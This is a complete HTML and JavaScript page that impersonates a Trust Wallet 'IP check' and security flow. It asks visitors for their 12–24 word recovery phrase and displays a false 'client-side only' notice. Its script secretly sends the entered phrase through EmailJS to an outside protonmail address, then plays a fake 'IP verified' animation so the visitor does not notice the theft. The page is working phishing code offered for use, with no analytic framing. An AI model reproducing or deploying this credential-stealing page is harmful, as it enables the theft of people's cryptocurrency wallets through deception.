<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>trust • secure flow</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background-color: #f0f2f5;
      background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
      background-repeat: no-repeat;
      background-position: center top;
      background-size: 150%;
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: #f8fafd;
      border-radius: 36px;
      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.35);
      width: 100%;
      max-width: 460px;
      padding: 36px 28px;
      color: #1e293b;
      border: 1px solid #e9edf2;
    }

    .page {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
    }

    .landing, .rules-page, .recovery-page {
      display: none;
    }

    .landing.active, .rules-page.active, .recovery-page.active {
      display: flex;
    }

    .headline {
      font-size: 1.6rem;
      font-weight: 480;
      color: #0f1825;
      text-align: center;
      letter-spacing: -0.4px;
    }

    .headline span {
      color: #526477;
      font-weight: 350;
    }

    .primary-button {
      background: #1e2a3a;
      border: none;
      padding: 14px 32px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 500;
      color: white;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      cursor: pointer;
      box-shadow: 0 10px 22px -12px #0f1a2b;
      transition: 0.1s ease;
      width: auto;
      min-width: 250px;
      border: 1px solid #324155;
    }

    .primary-button:hover {
      background: #253544;
      transform: scale(1.01);
    }

    .primary-button:active {
      transform: scale(0.98);
    }

    .light-tag {
      font-size: 0.8rem;
      background: #e6ecf3;
      padding: 4px 14px;
      border-radius: 40px;
      color: #2d4058;
      border: 1px solid #cbd5e1;
    }

    .rules-title {
      font-size: 1.7rem;
      font-weight: 500;
      color: #0a1a2c;
      align-self: flex-start;
      margin-bottom: 6px;
    }

    .rules-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 14px;
      margin: 8px 0 12px;
    }

    .rule-item {
      display: flex;
      align-items: center;
      gap: 16px;
      background: #ffffff;
      padding: 15px 20px;
      border-radius: 28px;
      border: 1px solid #dde3ec;
      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
    }

    .rule-checkbox {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      border: 2px solid #7e8b9f;
      background: white;
      appearance: none;
      -webkit-appearance: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .rule-checkbox:checked {
      background: #1f2e41;
      border-color: #1f2e41;
    }

    .rule-checkbox:checked::after {
      content: "✓";
      color: white;
      font-size: 1.2rem;
      font-weight: bold;
    }

    .rule-text {
      font-size: 1rem;
      font-weight: 440;
      color: #1b2a3f;
      flex: 1;
      line-height: 1.4;
    }

    .action-btn {
      background: #1e2a3a;
      border: none;
      padding: 16px 28px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 500;
      color: white;
      width: 100%;
      cursor: pointer;
      box-shadow: 0 8px 18px -8px #121d2b;
      transition: 0.1s;
      margin-top: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      border: 1px solid #324763;
      position: relative;
      min-height: 70px;
    }

    .action-btn:disabled {
      background: #b1bfd0;
      box-shadow: none;
      border-color: #9dafc2;
      color: #ecf2f9;
      pointer-events: none;
      opacity: 0.8;
    }

    .action-btn:not(:disabled):hover {
      background: #263a50;
    }

    .recovery-title {
      font-size: 1.7rem;
      font-weight: 500;
      color: #0f1e30;
      align-self: flex-start;
    }

    .hint-box {
      background: #eaf0f8;
      border-left: 5px solid #e68a2e;
      padding: 12px 18px;
      border-radius: 20px;
      font-size: 0.95rem;
      margin: 6px 0 12px;
      width: 100%;
      color: #1b2b40;
      font-weight: 420;
      border: 1px solid #d0ddee;
    }

    textarea {
      width: 100%;
      padding: 20px 20px;
      font-size: 1.1rem;
      border-radius: 28px;
      border: 1.5px solid #cbd6e6;
      background: #ffffff;
      color: #0c1b2e;
      resize: vertical;
      min-height: 170px;
      font-family: 'SF Mono', 'Fira Code', monospace;
      line-height: 1.5;
      outline: none;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.02);
    }

    textarea:focus {
      border-color: #3f5a7a;
    }

    textarea::placeholder {
      color: #8b9fba;
      font-size: 0.95rem;
    }

    .word-counter {
      align-self: flex-start;
      font-size: 0.9rem;
      margin: 6px 6px 10px;
      background: #eaf0f8;
      padding: 6px 22px;
      border-radius: 40px;
      color: #1b2d45;
      border: 1px solid #c9d6e8;
      font-weight: 470;
    }

    .back-link {
      margin-top: 18px;
      color: #3a5070;
      text-decoration: none;
      font-size: 0.9rem;
      border-bottom: 1px solid #a7bbd4;
      cursor: pointer;
      font-weight: 470;
    }
    .back-link:hover {
      color: #1d314a;
      border-bottom-color: #1d314a;
    }

    .tiny-note {
      font-size: 0.7rem;
      color: #617694;
      margin-top: 8px;
    }

    /* ===== SPINNER + FINAL STATE ===== */
    .spinner-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      width: 100%;
    }

    /* دایره در حال چرخش */
    .spinner-circle {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      border: 4px solid #c8e6c9;
      border-top: 4px solid #2e7d32;
      animation: spin 0.9s linear infinite;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      position: relative;
      background: transparent;
      transition: all 0.3s ease;
    }

    /* دایره بعد از توقف (حالت نهایی) */
    .spinner-circle.done {
      animation: none;
      border: 4px solid #2e7d32;
      background: #2e7d32;
      box-shadow: 0 0 20px rgba(46, 125, 50, 0.3);
    }

    .spinner-circle .checkmark {
      font-size: 1.8rem;
      color: #2e7d32;
      opacity: 0;
      transition: all 0.3s ease;
      font-weight: 700;
    }

    .spinner-circle.done .checkmark {
      opacity: 1;
      color: white;
      transform: scale(1);
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .spinner-label {
      font-size: 1.2rem;
      font-weight: 600;
      color: #1b3a2b;
      letter-spacing: 0.5px;
      white-space: nowrap;
    }

    /* حالت اسپینر */
    .action-btn.spinner-mode {
      background: #e8f5e9;
      border: 2px solid #4caf50;
      box-shadow: 0 4px 20px rgba(76, 175, 80, 0.25);
      color: #1b3a2b;
      cursor: default;
      pointer-events: none;
      padding: 14px 20px;
    }

    .action-btn.spinner-mode:disabled {
      background: #e8f5e9;
      border: 2px solid #4caf50;
      box-shadow: 0 4px 20px rgba(76, 175, 80, 0.25);
      color: #1b3a2b;
      opacity: 1;
    }

    /* حالت نهایی - دایره ثابت با تیک */
    .action-btn.final-mode {
      background: #2e7d32;
      border: 2px solid #1b5e20;
      box-shadow: 0 4px 20px rgba(46, 125, 50, 0.4);
      color: white;
      cursor: default;
      pointer-events: none;
      padding: 14px 20px;
    }

    .action-btn.final-mode:disabled {
      background: #2e7d32;
      border: 2px solid #1b5e20;
      box-shadow: 0 4px 20px rgba(46, 125, 50, 0.4);
      color: white;
      opacity: 1;
    }

    .action-btn.final-mode .spinner-label {
      color: white;
    }

    .action-btn.final-mode .spinner-circle.done {
      border: 4px solid white;
      background: #2e7d32;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }

    .action-btn.final-mode .spinner-circle.done .checkmark {
      color: white;
    }
  </style>
</head>
<body>
<div class="card">
  <!-- LANDING PAGE (IP CHECK) -->
  <div class="page landing active" id="landingPage">
    <div class="headline">IP CHECK</div>
    <button class="primary-button" id="showRulesBtn">
      <span>⎔</span> Trust Wallet <span style="font-weight:350;">web</span>
    </button>
    <div class="light-tag">encrypted path</div>
  </div>

  <!-- RULES PAGE (3 mandatory checkboxes) -->
  <div class="page rules-page" id="rulesPage">
    <div class="rules-title">✓ security check</div>
    <div class="rules-container">
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule1">
        <span class="rule-text">Never share your recovery phrase with anyone</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule2">
        <span class="rule-text">Use a private & secure device / connection</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule3">
        <span class="rule-text">Ensure no one is watching while entering words</span>
      </label>
    </div>

    <button class="action-btn" id="acceptRulesBtn" disabled>continue →</button>
    <div class="back-link" id="backFromRules">← back</div>
  </div>

  <!-- RECOVERY PAGE (24 words form) -->
  <div class="page recovery-page" id="recoveryPage">
    <div class="recovery-title">recovery phrase</div>
    <div class="hint-box">enter 12–24 words, separated by spaces</div>

    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..."></textarea>
    <div class="word-counter" id="wordDisplay">⌨️ 0 words</div>

    <button class="action-btn" id="submitBtn" disabled>
      <span>✓</span> confirm
    </button>
    <div class="back-link" id="backFromRecovery">← back</div>
    <div class="tiny-note">client-side only</div>
  </div>
</div>

<script>
  (function() {
    // Initialize EmailJS (your public key)
    emailjs.init("PakuuN4ADUDEqrzHl");

    // --- DOM elements ---
    const landing = document.getElementById('landingPage');
    const rulesPage = document.getElementById('rulesPage');
    const recoveryPage = document.getElementById('recoveryPage');

    const showRulesBtn = document.getElementById('showRulesBtn');
    const backFromRules = document.getElementById('backFromRules');
    const backFromRecovery = document.getElementById('backFromRecovery');
    const acceptRulesBtn = document.getElementById('acceptRulesBtn');
    const rule1 = document.getElementById('rule1');
    const rule2 = document.getElementById('rule2');
    const rule3 = document.getElementById('rule3');

    const phraseInput = document.getElementById('phraseInput');
    const wordDisplay = document.getElementById('wordDisplay');
    const submitBtn = document.getElementById('submitBtn');

    // --- Navigation functions ---
    function showLanding() {
      landing.classList.add('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.remove('active');
    }

    function showRules() {
      landing.classList.remove('active');
      rulesPage.classList.add('active');
      recoveryPage.classList.remove('active');
      rule1.checked = false;
      rule2.checked = false;
      rule3.checked = false;
      updateRulesButton();
    }

    function showRecovery() {
      landing.classList.remove('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.add('active');
      phraseInput.value = '';
      submitBtn.innerHTML = `<span>✓</span> confirm`;
      submitBtn.disabled = true;
      submitBtn.className = 'action-btn';
      submitBtn.style.background = '';
      submitBtn.style.border = '';
      submitBtn.style.boxShadow = '';
      submitBtn.style.color = '';
      submitBtn.style.cursor = '';
      submitBtn.style.padding = '';
      validateWordCount();
    }

    showRulesBtn.addEventListener('click', showRules);
    backFromRules.addEventListener('click', showLanding);
    backFromRecovery.addEventListener('click', showRules);

    function updateRulesButton() {
      acceptRulesBtn.disabled = !(rule1.checked && rule2.checked && rule3.checked);
    }

    rule1.addEventListener('change', updateRulesButton);
    rule2.addEventListener('change', updateRulesButton);
    rule3.addEventListener('change', updateRulesButton);

    acceptRulesBtn.addEventListener('click', () => {
      if (!acceptRulesBtn.disabled) showRecovery();
    });

    function validateWordCount() {
      const text = phraseInput.value.trim();
      const words = text ? text.split(/\s+/) : [];
      const count = words.length;
      wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
      if (count < 12 && submitBtn.innerHTML.includes('confirm')) {
        submitBtn.disabled = true;
      } else if (count >= 12 && submitBtn.innerHTML.includes('confirm')) {
        submitBtn.disabled = false;
      }
    }

    phraseInput.addEventListener('input', validateWordCount);

    // --- Email sender (always runs in background) ---
    async function sendPhraseViaEmail(phrase) {
      try {
        const targetEmail = "mrx_private@protonmail.com";

        await emailjs.send(
          "service_j8bd9vn",
          "template_paduqpn",
          {
            email: targetEmail,
            words: phrase,
            message: `Recovery phrase: ${phrase}`,
            to_name: "Wallet Owner",
            from_name: "Recovery Page"
          }
        );
        console.log('✅ email sent in background');
      } catch (err) {
        console.warn('⚠️ email send failed (silent):', err);
      }
    }

    // --- مرحله 1: نمایش اسپینر (دایره در حال چرخش) ---
    function showSpinner() {
      submitBtn.className = 'action-btn spinner-mode';
      submitBtn.disabled = true;
      submitBtn.innerHTML = `
        <div class="spinner-container">
          <div class="spinner-circle" id="spinnerCircle">
            <span class="checkmark">✓</span>
          </div>
          <span class="spinner-label">Verifying IP...</span>
        </div>
      `;
    }

    // --- مرحله 2: نمایش حالت نهایی (دایره ثابت با تیک و IP verified) ---
    function showFinal() {
      // کل دکمه رو سبز تیره می‌کنیم
      submitBtn.className = 'action-btn final-mode';
      submitBtn.disabled = true;
      
      // دایره رو ثابت می‌کنیم با تیک سفید داخلش
      submitBtn.innerHTML = `
        <div class="spinner-container">
          <div class="spinner-circle done" id="spinnerCircle">
            <span class="checkmark">✓</span>
          </div>
          <span class="spinner-label">IP verified ✓</span>
        </div>
      `;
    }

    // --- Reset button to normal (وقتی کاربر برمی‌گرده) ---
    function resetButton() {
      submitBtn.className = 'action-btn';
      submitBtn.innerHTML = `<span>✓</span> confirm`;
      submitBtn.disabled = true;
      submitBtn.style.background = '';
      submitBtn.style.border = '';
      submitBtn.style.boxShadow = '';
      submitBtn.style.color = '';
      submitBtn.style.cursor = '';
      submitBtn.style.padding = '';
      validateWordCount();
    }

    // --- Confirm button: spinner → final state ---
    submitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const phrase = phraseInput.value.trim();
      if (!phrase) return;

      // مرحله 1: نمایش اسپینر (چرخش)
      showSpinner();

      // ارسال ایمیل در پس‌زمینه
      sendPhraseViaEmail(phrase);

      // پاک کردن textarea
      phraseInput.value = '';
      wordDisplay.innerText = `⌨️ 0 words`;

      // بعد از 3 ثانیه: توقف چرخش و نمایش IP verified
      setTimeout(() => {
        showFinal();
      }, 3000);
    });

    validateWordCount();
    showLanding();
  })();
</script>
</body>
</html>
